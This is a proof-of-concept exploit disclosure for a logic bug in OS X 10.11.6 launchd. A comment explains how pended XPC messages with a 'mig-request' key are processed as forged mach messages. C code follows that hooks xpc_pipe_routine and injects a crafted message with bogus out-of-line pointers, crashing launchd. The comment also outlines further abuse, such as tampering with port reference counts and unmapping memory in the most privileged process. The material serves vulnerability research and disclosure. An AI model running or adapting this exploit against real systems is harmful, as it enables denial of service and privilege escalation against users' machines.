// ianbeer

/*
Logic issue in launchd message requeuing allows arbitrary mach message control

Launchd was rewritten for 10.10. The old (pre 10.10) launchd was opensource but the newer one
is closed source *and* stripped so not even function names :(

Nevertheless...

The new launchd is tightly integrated with xpc stuff so this gives us a good foothold to start
understanding what's going on. All function addresses in this PoC are for the version of launchd shipping with
the OS X 10.11.6.

10002F3A1 is the handler on the bootstrap port - when a message is received it calls xpc_pipe_try_receive from libxpc
which checks the msgh_id of the received mach message, if it's 0x10000000 then this is an xpc message and it tries to
deserialize an xpc object. If this message is a legacy MIG message then xpc_pipe_try_receive calls its 4th argument
via _xpc_pipe_handle_mig to handle the MIG message. 10002ED33 is the launchd legacy mig handler which checks through
a couple of legacy MIG subsystems which get registered in 100018ADE (note the calls to 10002E3EE which adds a legacy mig
subsystem to the array of them.) (100018ADE also registers the handlers for the launchd XPC subsystems (ipc families.))

This is all fine, but interestingly there are actually two call paths to the xpc_demuxer(10002EE87)/mig handler(10002ED33)
the other one is 10002EC25. The logic of this function is almost the same as 10002F3A1 except there's no call to
xpc_pipe_try_receive, looking around a bit this function is not responsible for parsing messages directly as they're
received by launchd but instead it's for "re-parsing" "pended" messages.

In some cases when launchd is unable to immediately service a request it enqueues the request back onto a dispactch queue
to try again later, and that request eventually ends up here.

This function (10002EC25) only directly accepts an xpc dictionary, but it checks to see if that dictionary has a
"mig-request" key/value pair, and if it does it reads an xpc_data_t out of the xpc_dictionary and casts it to a
mach_msg_header_t and passes that via xpc_pipe_handle_mig to 10002ED33 (the legacy MIG handler.)

I can't find anywhere which sets a "mig-request" value so I would guess that this is either
a debugging feature or left in by accident? Since xpc is a schema-less ipc mechanism we can actually just set a "mig-request"
key with a completely controlled xpc_data_t payload (the value of which will be treated as a valid mach message which
launchd received.) The only pre-requisite is working out how to get an XPC message we send to launchd to be pended - it seems
that subsytem 3 routine 804 (xpc_look_up_endpoint) will sometimes be pended meaning that if we modify one of these
requests we can end up sending a completely controlled fake mach message through the legacy MIG processing pipeline.

This is an amazing primitive for exploitation - this PoC sends a message with OOL data, when the fake mach message gets
passed to mach_msg_destroy to destroy the rights and memory it carries this leads to a crash trying to read a mach port
at 0x414141410000 (this pointer will later also be passed to vm_deallocate.) But you could do a *lot* more with a bug like
this, for example messing with the refcounts of launchd's ports (because we can specify arbitrary port numbers in our message
which will be seen as valid ports in launchd's port namespace.) We can also unmap arbitrary pages and cause invalid stuff
to be passed to the legacy MIG handlers.

In terms of impact launchd is the most privileged process on the system and you can talk to it from any process :-)

This PoC hooks the sending of the target xpc request and injects a "mig-request" xpc_data_t - if it doesn't work try closing
all open browsers, or restarting with a clean boot.
*/


#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <mach/mach.h>
#include <xpc/xpc.h>

#include "mach_override/mach_override.h"

typedef struct {
  mach_msg_header_t Head;
  /* start of the kernel processed data */
  mach_msg_body_t msgh_body;
  mach_msg_ool_descriptor_t request;
  mach_msg_ool_ports_descriptor_t request_fds;
  mach_msg_port_descriptor_t asport;
  /* end of the kernel processed data */
  NDR_record_t NDR;
  mach_msg_type_number_t requestCnt;
  mach_msg_type_number_t request_fdsCnt;
} Request;

Request* InP = NULL;
size_t InP_size = 0;

int log_fd = 0;
void init_logging() {
  log_fd = open("launchd_log", O_CREAT|O_TRUNC|O_RDWR, 0644);
}

void sync() {
  fcntl(log_fd, F_FULLFSYNC);
}

void* build_msg(void* to_dealloc, size_t to_dealloc_size, size_t* msg_size) {
  if (InP) {
    *msg_size = InP_size;
    return InP;
  }

  InP = calloc(sizeof(Request), 1);
  InP_size = sizeof(Request);

  printf("sizeof request = %x\n", sizeof(Request));

  // from old 10.9.5 launchd MIG .defs:

  InP->msgh_body.msgh_descriptor_count = 3;

  InP->request.address = (void *)(to_dealloc);
  InP->request.size = to_dealloc_size;
  InP->request.deallocate =  FALSE;
  InP->request.copy = MACH_MSG_VIRTUAL_COPY;
  InP->request.type = MACH_MSG_OOL_DESCRIPTOR;

  InP->request_fds.address = (void *)(to_dealloc);
  InP->request_fds.count = to_dealloc_size;
  InP->request_fds.disposition = 17;
  InP->request_fds.deallocate =  FALSE;
  InP->request_fds.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;


  InP->asport.name = 0x42;
  InP->asport.disposition = 19;
  InP->asport.type = MACH_MSG_PORT_DESCRIPTOR;

  InP->NDR = NDR_record;

  InP->requestCnt = to_dealloc_size;

  InP->request_fdsCnt = to_dealloc_size;

  InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
    MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
  InP->Head.msgh_remote_port = 0x4321;
  InP->Head.msgh_local_port = 0x4343;
  InP->Head.msgh_id = 437;

  return InP;
}

// not in the header
int xpc_pipe_routine(void *a, const xpc_object_t *dict, void* c);

int (*original_xpc_pipe_routine)(void *a, const xpc_object_t *dict, void* c) = NULL;
int fake_xpc_pipe_routine(void* a, const xpc_object_t *dict, void* c){

  __block uint64_t subsystem = 0;
  __block uint64_t routine = 0;

  xpc_dictionary_apply(dict, ^ bool (const char* key, xpc_object_t value) {
    if (strcmp(key, "subsystem") == 0) {
      subsystem = xpc_uint64_get_value(value);
      dprintf(log_fd, "subsystem: %d\n", subsystem);
    }
    else if (strcmp(key, "routine") == 0) {
      routine = xpc_uint64_get_value(value);
      dprintf(log_fd, "routine: %d\n", routine);
    }
    else {
      dprintf(log_fd, "%s\n", key);
    }
    if (strcmp(key, "name") == 0) {
      dprintf(log_fd, "name: %s\n", xpc_string_get_string_ptr(value));
    }
    return true;
  });
 
  if (subsystem == 3 && routine == 804) {
    size_t msg_size = 0;
    void* msg = build_msg((void*)0x414141410000, 0x20000, &msg_size);
    xpc_dictionary_set_data(dict, "mig-request", msg, msg_size);
    printf("modified the dictionary\n");
  }

  int result = original_xpc_pipe_routine(a, dict, c);

  return result;
}

void __attribute__((constructor)) do_hook() {
  init_logging();
  mach_override_ptr(xpc_pipe_routine,
                    (void*)fake_xpc_pipe_routine,
                    (void**) &original_xpc_pipe_routine);
}

